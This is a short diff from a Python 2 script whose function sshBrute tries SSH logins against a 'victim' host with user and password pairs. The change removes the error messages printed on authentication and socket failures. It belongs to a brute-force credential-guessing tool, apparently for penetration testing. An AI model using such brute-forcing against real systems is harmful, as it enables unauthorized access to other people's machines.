@@ -88,13 +88,9 @@ def sshBrute(victim,db,coll,monkeyId):
             ssh.connect(victim, 22, user, pwd)
 
         except paramiko.AuthenticationException, e:
-            print 'There was an SSH authentication exception'
-            print e
             pass
 
         except socket.error, e:
-            print 'There was an issue opening the socket'
-            print e
             pass
 
     endTime = time.ctime()
